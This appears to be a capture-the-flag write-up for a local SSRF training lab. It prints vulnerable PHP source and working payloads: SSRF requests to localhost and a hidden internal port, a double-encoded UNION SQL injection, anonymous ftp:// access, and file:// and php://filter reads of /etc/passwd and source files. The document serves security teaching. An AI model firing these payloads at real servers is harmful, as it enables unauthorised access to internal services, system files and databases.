@@ -1,0 +1,428 @@
+[README]
+
+[*] Target: http://localhost:9001
+
+    - We can easily see that there are 6 Flags in this lab, including:
+
+        [+] admin.php: "Flag 1: CBJS{FAKE_FLAG_FAKE_FLAG}"
+
+        [+] web-internal/index.php: "Flag2: CBJS{FAKE_FLAG_FAKE_FLAG}"
+
+        [+] Flag table in myDB database (db.sql): "Flag3:CBJS{FAKE_FLAG_FAKE_FLAG}"
+
+        [+] /var/ftp/flag.txt (Dockerfile): "Flag 4: CBJS{FAKE_FLAG_FAKE_FLAG}"
+
+        [+] /etc/passwd (Dockerfile): "Flag5: CBJS{FAKE_FLAG_FAKE_FLAG}"
+
+        [+] hidden_feature.php: "Flag6: CBJS{FAKE_FLAG_FAKE_FLAG}"
+
+    => Solve them one by one, and following the order that CBJS gave will be a wise choice and good for our mindset
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+[Level 1]
+
+[*] Target: Capture the "Flag 1"
+
+    - Let's see, what's happened in the admin.php
+
+        [+] admin.php
+
+            <?php
+            if ($_SERVER['REMOTE_ADDR'] === "127.0.0.1") { // [?] Only localhost can execute this feature
+                system("uname -a");
+                system("ifconfig eth0");
+                die("Flag 1: CBJS{FAKE_FLAG_FAKE_FLAG}");
+            }
+            http_response_code(403);
+            die("Error 403 forbidden, can only be accessed by 127.0.0.1");
+                
+            [Fun Fact] $_SERVER['REMOTE_ADDR'] takes the IP of the client through TCP request
+
+                            +-----------------+
+                            |   Application   |  <-> Protocols: HTTP; FTP; SSH ...
+                            +-----------------+       
+                                    |
+                                    v 
+                            +-----------------+           
+                            |    Transport    |  <-> Protocols: TCP, UDP ...
+                            +-----------------+
+                                    |
+                                    v 
+                            +-----------------+           
+                            |     Network     |  <-> Protocols: IP (IPv4, IPv6) 
+                            +-----------------+  
+                                    |
+                                    v 
+                            +-----------------+           
+                            |    Data Link    |  <-> Protocols: Ethernet, WiFi ...
+                            +-----------------+
+
+            => This means you can not change the IP via the Client-IP or X-Forwarded-For header in your HTTP request
+
+    - But this is an SSRF lab right? The main purpose for this kind of attack is to forgery, forgery that we are the server, running from the internal
+
+    - And if you're thinking what I'm thinking. Yes, the feature.php provided us with what we need
+
+        [+] feature.php
+
+            ...
+            $error = $content = '';
+            if (isset($_GET['url'])) {
+                if (!filter_var($_GET['url'], FILTER_VALIDATE_URL)) {
+                    $error = 'Not a valid url';
+                } else { $content = base64_encode(file_get_contents($_GET['url'])); }
+            }
+            ?>
+            ...
+            <?php if (strlen($content) > 0) {
+                echo '<img src="data:image/png;base64, ' . $content . '">';
+            } ?>
+
+            => So now if we enter a URL in the form and send it to the server, the server will craw the info from that URL and give us in the format of base64 encoded
+               of course, there is a decode function below but nah! 
+
+    => The main question is what if we entered "http://127.0.0.1:9001/admin.php" into that form, the server will craw from IT OWN resources
+
+    [Testing time] Remember to use burpsuite since "echo '<img src="data:image/png;base64, ' . $content . '">';" (~.~!)
+
+            GET /feature.php?url=http%3A%2F%2F127.0.0.1%3A9001%2Fadmin.php
+
+                                    |
+                                    v
+            
+            "data:image/png;base64, TGludXggZWI4ZGE0ZjQ1Y2E2IDYuNC4xNi1saW5...7RkFLRV9GTEFHX0ZBS0VfRkxBR30="
+
+        (base) bigbox@ubuntu:~/Github/cyberjutsu/done$ echo 'TGludXggZWI4ZGE0ZjQ1Y2E2IDYuNC4xNi1saW5...7RkFLRV9GTEFHX0ZBS0VfRkxBR30=' | base64 -d
+
+            Linux eb8da4f45ca6 6.4.16-linuxkit #1 SMP PREEMPT_DYNAMIC Sat Sep 23 13:39:52 UTC 2023 x86_64 GNU/Linux
+            eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+                  ...
+                    TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+            Flag 1: CBJS{FAKE_FLAG_FAKE_FLAG}
+
+    [Final Result: SSRF] Flag 1: CBJS{FAKE_FLAG_FAKE_FLAG}
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+[Level 2]
+
+[*] Target: Capture the "Flag 2"
+
+    - This level isn't that hard but you still need to read it carefully, or you will misunderstand some basic things
+        
+        [+] docker-compose.yaml 
+
+            ...
+            web:
+                container_name: ssrf-web
+                depends_on:
+                - database
+                build: ./web
+                ports:
+                - '9001:9001' // [?] Stuff in the ./web are built as the main files for public web
+                ...
+                volumes:
+                - ./web/src:/var/cbjs/html 
+                - ./web/web-internal:/var/cbjs/internal/html 
+            ...
+
+        [+] web/Dockerfile
+
+            ...
+            COPY ./src /var/cbjs/html
+
+            COPY ./web-internal /var/cbjs/internal/html 
+
+            RUN chown -R www-data:www-data /var/cbjs/html
+
+            COPY ./config/000-default.conf /etc/apache2/sites-available/
+
+            /*
+            This is 000-default.conf, just to make sure that you can understand this easily
+
+            <VirtualHost *:9001>
+
+                    ServerAdmin webmaster@localhost
+                    DocumentRoot /var/cbjs/html
+
+                    ErrorLog ${APACHE_LOG_DIR}/error.log
+                    CustomLog ${APACHE_LOG_DIR}/access.log combined
+
+            </VirtualHost>
+
+            <VirtualHost *:8888>
+
+                    ServerAdmin webmaster@localhost
+                    DocumentRoot /var/cbjs/internal/html
+
+                    ErrorLog ${APACHE_LOG_DIR}/error.log
+                    CustomLog ${APACHE_LOG_DIR}/access.log combined
+
+            </VirtualHost>
+            */
+            COPY ./config/apache2.conf /etc/apache2/ 
+
+            RUN echo "Listen 8888" >> /etc/apache2/ports.conf
+            RUN echo "Listen 9001" >> /etc/apache2/ports.conf
+            ...
+
+    - Yep! There is a hidden open port running int the server side that not be forwarded by Docker for clients like us to see
+
+    [Testing time] Our target is http://127.0.0.1:8888/index.php
+
+            GET /feature.php?url=http%3a%2f%2f127.0.0.1%3a8888%2findex.php
+
+                                    |
+                                    v
+            
+            "data:image/png;base64, PGh0bWw+DQoNCjxoZWFkPg0KICAgIDwhLS0g...vYT4NCg0KPC9ib2R5Pg0KDQo8L2h0bWw+"
+
+    bigbox@ubuntu:~/Github/cyberjutsu/done$ echo 'PGh0bWw+DQoNCjxoZWFkPg0KICAgIDwhLS0g...vYT4NCg0KPC9ib2R5Pg0KDQo8L2h0bWw+'| base64 -d
+
+        <html>
+
+        <head>
+            <!-- For UX/UI only -->
+            <link rel="stylesheet" href="..." integrity="..." crossorigin="anonymous">
+        </head>
+
+        <body>
+            <h3>Hello admin, welcome back</h3>
+            <pre>Flag2: CBJS{FAKE_FLAG_FAKE_FLAG}</pre>
+
+            <a class="nav-item nav-link" href="/post.php?id=1">SSRF TUTORIAL</a>
+            <a class="nav-item nav-link" href="/post.php?id=2">XSS TUTORIAL</a>
+            <a class="nav-item nav-link" href="/post.php?id=3">RECON TUTORIAL</a>
+
+        </body>
+
+    [Final Result: SSRF] Flag2: CBJS{FAKE_FLAG_FAKE_FLAG}
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+[Level 3]
+
+[*] Target: Capture the "Flag 3"
+
+    - Flag 3 is now in the database, I think SQLi is the key in this situation, let's find the sus sink
+
+        [+] post.php
+
+            ...
+            include("connect_db.php");
+
+            if (isset($_GET['id'])) {
+                $sql = "SELECT * FROM Posts WHERE id=" . $_GET['id']; // [?] Untrusted data's here, next stuff, we need to find the input for it
+                $result = $conn->query($sql) or die(mysqli_error($conn)); // [?] Just query()? Good! we don't need to bypass any filter
+                if ($result->num_rows > 0) {
+                    while ($row = $result->fetch_assoc()) {
+                        echo "<pre>Title: " . $row["title"] . "</pre>";
+                        echo "<pre>Content: " . $row["content"] . "</pre>"; // [?] Thank CBJS (^.^`) I hate blind SQLi too
+                        echo "<pre>Author: " . $row["author"] . "</pre>";
+                    }
+                ...
+
+        [+] index.php 
+
+            ...
+                <body>
+                    <h3>Hello admin, welcome back</h3>
+                    <pre>Flag2: CBJS{FAKE_FLAG_FAKE_FLAG}</pre>
+
+                    <a class="nav-item nav-link" href="/post.php?id=1">SSRF TUTORIAL</a> // [?] As CBJS once said "Untrusted data + Unsafe method = BOOM!"
+                    <a class="nav-item nav-link" href="/post.php?id=2">XSS TUTORIAL</a>
+                    <a class="nav-item nav-link" href="/post.php?id=3">RECON TUTORIAL</a>
+
+                </body>
+
+    - However! Before deep dive into SQLi, we need to see what we can get from a "normal" request 
+
+        GET /feature.php?url=http%3a%2f%2f127.0.0.1%3a8888%2fpost.php%3fid%3d1 <=> http://127.0.0.1:8888/post.php?id=1
+
+                                            |
+                                            v
+
+        "data:image/png;base64, PHByZT5UaXRsZTo...V0aG9yOiBhZG1pbjwvcHJlPg==" 
+        
+            <=> <pre>Title: SSRF TUTORIAL</pre>
+                <pre>Lorem ipsum dolor ...</pre> // (~.~!) Haha that's funny 
+                <pre>Author: admin</pre>
+
+    [Testing Time] Okay! Let's see what do we have in the database
+
+        [+] db.sql
+
+            ...
+            CREATE TABLE `Posts`(
+                `id` INT NOT NULL PRIMARY KEY,
+                `title` TEXT NOT NULL,
+                `content` TEXT NOT NULL, 
+                `author` VARCHAR(50) NOT NULL
+            );
+            ...
+            CREATE TABLE `Flag` ( `secret` TEXT NOT NULL );
+            ...
+
+        => 4 columns! but, only "title". "content" and "author" are shown
+
+        => "SELECT * FROM Posts WHERE id=" . $_GET['id'];
+
+        <=> mysql> SELECT * FROM Posts WHERE id=31337 UNION SELECT NULL, NULL, secret, NULL FROM Flag;
+            +------+-------+---------------------------------+--------+
+            | id   | title | content                         | author |
+            +------+-------+---------------------------------+--------+
+            | NULL | NULL  | Flag3:CBJS{FAKE_FLAG_FAKE_FLAG} | NULL   |
+            +------+-------+---------------------------------+--------+
+            1 row in set (0.01 sec)
+
+    - Now! if you just simply testing this payload, there will be no result, why???
+
+    - Imagine the path of your payload
+
+        URL encoded payload                  URL decoded payload                   URL decoded payload [Error! Not a valid URL]
+                              --->                                          ---> 
+            client side              client-side of the internal web page             server-side of the internal web page
+
+    - We can easily solve this problem by encoding the payload twice 
+
+        31337 UNION SELECT NULL, NULL, secret, NULL FROM Flag;
+
+        => 31337%20UNION%20SELECT%20NULL%2C%20NULL%2C%20secret%2C%20NULL%20FROM%20Flag%3B
+
+        => 31337%2520UNION%2520SELECT%2520NULL%252C%2520NULL%252C%2520secret%252C%2520NULL%2520FROM%2520Flag%253B
+    
+    => "data:image/png;base64, PHByZT5UaXRsZTogPC9wc...XRob3I6IDwvcHJlPg=="
+
+    <=> <pre>Title: </pre>
+        <pre>Content: Flag3:CBJS{FAKE_FLAG_FAKE_FLAG}</pre>
+        <pre>Author: </pre>
+
+    [Final Result: SSRF] Flag3:CBJS{FAKE_FLAG_FAKE_FLAG}
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+[Level 4]
+
+[*] Target: Capture the "Flag 4"
+
+    - This time, we gonna attack an FTP server, before that, you might need to know something about the docker container
+
+    - So when you interact with a container via a protocol and use port forwarding to access services inside containers from outside
+      
+      And when containers communicate with each other within a Docker network
+
+      it's akin to how devices interact and communicate in a networked environment using NAT.
+
+    - Let me show you a realistic example
+
+        [+] admin.php (of course I fixed it a little bit)
+
+            ...
+            http_response_code(403);
+            die($_SERVER['REMOTE_ADDR']); // [?] fixed
+
+            => http://localhost:9001/admin.php <=> 172.18.0.1 // [?] Our IP or more exactly our IP in the eyes of containers
+
+
+            (base) bigbox@ubuntu:~/$ docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' $(docker ps -aq)
+            
+                172.18.0.4 // [?] This is the IP of "web"
+                172.18.0.3 // [?] This is the IP of "database"
+                172.18.0.2 // [?] This is the IP of "ftp"
+
+    - If in a normal black box CTF, you connect directly via port 21 of the target, but in this case, I suggest that you use the FTP URL way
+
+    - Since file_get_contents() can handle many kinds of URI like Local File, HTTP/HTTPS, ftp://, php://, data://, zip://, etc. We can access and read the flag.txt
+
+    - You might think that "Hey! Do we need credentials to access FTP?" the answer is "Yes"
+
+        FTP URLs typically follow this format: ftp://username:password@ftp.example.com/path/to/file
+
+    - But! in the ftp/Dockerfile
+
+        ... 
+        # Enable annonymous login FTP
+        RUN sed -i 's/anonymous_enable=NO/anonymous_enable=YES/g' /etc/vsftpd/vsftpd.conf
+        ...
+
+        => Guess what! If the FTP server allows anonymous access, an anonymous user can read files from the server without providing any credentials using an ftp:// URI
+
+    [Testing Time] 
+
+        GET /feature.php?url=ftp%3A%2F%2F172.18.0.2%2Fflag.txt <=> ftp://172.18.0.2/flag.txt
+
+                                                    |
+                                                    v
+
+        data:image/png;base64, RmxhZyA0OiBDQkpTe0ZBS0VfRkxBR19GQUtFX0ZMQUd9Cg==" <=> Flag 4: CBJS{FAKE_FLAG_FAKE_FLAG}
+
+    [Final Result: SSRF] Flag 4: CBJS{FAKE_FLAG_FAKE_FLAG}
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+[Level 5] + [Level 6]
+
+[*] Target: Capture the "Flag 5" & "Flag 6"
+
+    - Hmmm! Try to read the /etc/passwd, this should be easy since we all know that file_get_contents() can handle many kinds of URI
+
+    - One of the most famous URIs is "file://": Used to reference files on the local file system
+
+        [+] Flag 5
+
+            GET /feature.php?url=file%3A%2F%2F%2Fetc%2Fpasswd <=> file:///etc/passwd 
+
+                                            |
+                                            v
+
+            "data:image/png;base64, cm9vdDp4OjA6MDp...kxBR19GQUtFX0ZMQUd9Cg=="
+
+            <=> root:x:0:0:root:/root:/bin/bash
+                daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+                bin:x:2:2:bin:/bin:/usr/sbin/nologin
+                ...
+                ftp:x:102:104:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
+                Flag5: CBJS{FAKE_FLAG_FAKE_FLAG}
+
+        [+] Flag 6
+
+            GET /feature.php?url=file%3a%2f%2f%2fvar%2fcbjs%2fhtml%2fhidden_feature.php <=> file:///var/cbjs/html/hidden_feature.php
+
+                                            |
+                                            v    
+
+            "data:image/png;base64, PD9waHANCiRmbGFnID0gIkZsYWc2OiBDQkpTe0ZBS0VfRkxBR19GQUtFX0ZMQUd9IjsNCg==" 
+
+            <=> <?php $flag = "Flag6: CBJS{FAKE_FLAG_FAKE_FLAG}";
+
+    - If you are thinking "Something's wrong here! It's okay to read /etc/passwd but how can a black box guy find/var/cbjs/html/hidden_feature.php"
+
+    - The logic might be this:
+
+        Hacker using php:// uri to read feature.php <=> php://filter/read=convert.base64-encode/resource=feature.php (You must decode twice if using this payload)
+
+        => In the feature.php, he might focus on 'include("hidden_feature.php");' and try to read it
+
+            GET /feature.php?url=php://filter/read=convert.base64-encode/resource=hidden_feature.php
+
+                                            |
+                                            v   
+
+            "data:image/png;base64, UEQ5d2FIQU5DaVJtYkdGbklEMGdJa1pzWVdjMk9pQkRRa3BUZTBaQlMwVmZSa3hCUjE5R1FVdEZYMFpNUVVkOUlqc05DZz09"
+
+            <=> <?php $flag = "Flag6: CBJS{FAKE_FLAG_FAKE_FLAG}";
+
+    [Final Result: SSRF] Flag5: CBJS{FAKE_FLAG_FAKE_FLAG}
+                         Flag6: CBJS{FAKE_FLAG_FAKE_FLAG}
